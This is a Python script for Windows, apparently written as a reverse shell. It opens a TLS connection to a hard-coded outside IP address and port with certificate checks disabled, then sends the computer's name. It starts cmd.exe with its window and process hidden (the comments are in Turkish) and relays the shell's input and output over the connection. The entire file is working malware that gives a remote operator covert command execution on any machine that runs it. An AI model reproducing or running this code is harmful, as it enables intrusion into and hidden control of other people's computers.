import socket
import ssl
import subprocess
import threading
import os

def pipe_stream(source, destination):
    while True:
        try:
            data = source.read(1024) if hasattr(source, 'read') else source.recv(1024)
            if not data:
                break
            if hasattr(destination, 'write'):
                destination.write(data)
                destination.flush()
            else:
                destination.send(data)
        except:
            break

def connect_back():
    h = '185.194.175.132'
    p = 7001
    try:
        s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        s.setsockopt(socket.SOL_SOCKET, socket.SO_KEEPALIVE, 1)
        
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        
        ssls = ctx.wrap_socket(s, server_hostname='lab-manager')
        ssls.connect((h, p))
        
        computer_name = os.environ.get("COMPUTERNAME", "PC")
        ssls.send(f"--- Interaktif Oturum Basladi: {computer_name} ---\n".encode())
        
        # Windows pencere gizleme ayarları
        si = subprocess.STARTUPINFO()
        si.dwFlags |= subprocess.STARTF_USESHOWWINDOW
        si.wShowWindow = 0  # SW_HIDE: Pencereyi tamamen gizler
        
        # Süreç gizleme bayrakları ile cmd.exe başlatılıyor
        proc = subprocess.Popen(
            ['cmd.exe'],
            startupinfo=si,
            creationflags=subprocess.CREATE_NO_WINDOW,
            stdin=subprocess.PIPE,
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            bufsize=0
        )
        
        t1 = threading.Thread(target=pipe_stream, args=(ssls, proc.stdin))
        t2 = threading.Thread(target=pipe_stream, args=(proc.stdout, ssls))
        t3 = threading.Thread(target=pipe_stream, args=(proc.stderr, ssls))
        
        t1.start()
        t2.start()
        t3.start()
        
        proc.wait()
    except:
        pass
    finally:
        try:
            s.close()
        except:
            pass

if __name__ == "__main__":
    connect_back()
